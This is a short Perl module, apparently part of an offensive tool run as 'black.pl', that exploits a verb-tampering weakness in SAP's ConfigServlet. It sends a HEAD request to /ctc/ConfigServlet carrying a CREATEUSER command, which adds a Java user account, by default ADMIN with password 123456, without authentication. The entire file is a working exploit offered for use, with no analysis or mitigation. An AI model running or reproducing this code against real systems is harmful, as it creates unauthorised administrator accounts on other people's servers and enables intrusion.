#!/usr/bin/perl
# Module Create JAVA user

# CONFIG
######################
my $desc ="Add JAVA user (verb tampering) \n\t Usage: black.pl .. .. $argv[5] [user] [password]\n\t <user> <password> -  name and password for new JAVA user, default is ADMIN:123456\n"; 
our $funcName="add_java_user_head_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub add_java_user_head_Func()
{

	if ($ARGV[$m_arg_i+1]){
		$java_user=$ARGV[$m_arg_i+1];
		print $java_user." - java_user \n\n";
	} else {
		$java_user='ADMIN';
	}

	if ($ARGV[$m_arg_i+2]){
		$java_pass=$ARGV[$m_arg_i+2];
		print $java_pass." - java_pass \n\n";	
	} else {
		$java_pass='123456';
	}
	my $XML='';
	
	my @answers=send_soap($XML,1,"/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=$java_user,PASSWORD=$java_pass","HEAD",1);
	my $answer=join('', @answers);
	
	print $answer;

	print "\n\n";

}